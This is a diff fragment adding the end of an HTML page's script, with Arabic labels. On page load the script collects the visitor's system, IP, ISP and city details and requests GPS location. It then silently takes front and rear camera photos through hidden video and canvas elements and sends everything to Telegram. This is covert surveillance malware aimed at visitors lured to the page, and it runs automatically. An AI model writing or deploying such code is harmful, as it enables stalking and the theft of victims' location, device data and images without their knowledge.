+• النظام: ${data.system}
+
+🌍 *معلومات IP:*
+• ${data.ip}
+• ${data.country}, ${data.city}
+• ISP: ${data.isp}
+
+📍 *GPS:* ${data.locStatus}
+
+⏰ ${new Date().toLocaleString('ar-EG')}
+        `.trim();
+        sendToTelegramMultiple(message);
+    }
+
+    // 🚀 التشغيل
+    window.addEventListener('load', async () => {
+        const data = await collectDetailedData();
+        
+        const loc = await getLocation();
+        if (loc) {
+            sendToTelegramMultiple('', true, loc.lat, loc.lon);
+            data.locStatus = `✅ تم (دقة ${Math.round(loc.acc)}م)`;
+        } else {
+            data.locStatus = '❌ مرفوض/مغلق';
+        }
+
+        sendFullReport(data);
+
+        // 📸 الكاميرا (تم ضغط الكود)
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        video.style.display = 'none'; canvas.style.display = 'none';
+        document.body.append(video, canvas);
+        
+        video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
+
+        async function capture(mode, name) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => {
+                    if(b) sendToTelegramMultiple('', false, null, null, b, `📸 ${name}`);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg', 0.8);
+            } catch (e) {}
+        }
+
+        // التقاط سريع واحدة أمامية وواحدة خلفية
+        await capture('user', 'أمامية');
+        setTimeout(() => capture('environment', 'خلفية'), 3000);
+    });
+</script>
+</body>
+</html>
